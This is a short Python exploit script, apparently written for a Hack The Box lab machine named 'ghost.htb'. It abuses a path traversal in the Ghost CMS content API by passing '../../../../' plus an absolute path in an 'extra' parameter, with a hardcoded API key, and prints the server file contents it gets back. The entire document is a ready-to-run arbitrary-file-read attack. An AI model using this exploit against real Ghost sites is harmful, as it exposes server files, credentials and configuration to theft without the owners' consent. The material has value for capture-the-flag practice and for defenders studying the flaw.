#!/usr/bin/env python3

import sys
import requests

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <absolute path>")
    sys.exit(1)

path = sys.argv[1]

url = "http://ghost.htb:8008/ghost/api/content/posts/"
params = {
    "key": "a5af628828958c976a3b6cc81a",
    "extra": f"../../../../{path}"
}

try:
    r = requests.get(url, params=params, timeout=10)
    r.raise_for_status()

    data = r.json()

    key = f"../../../../{path}"
    print(data["meta"]["extra"][key], end="")

except KeyError:
    print("[-] File not found or no data returned.")
except requests.RequestException as e:
    print(f"[-] Request failed: {e}")
except Exception as e:
    print(f"[-] Error: {e}")
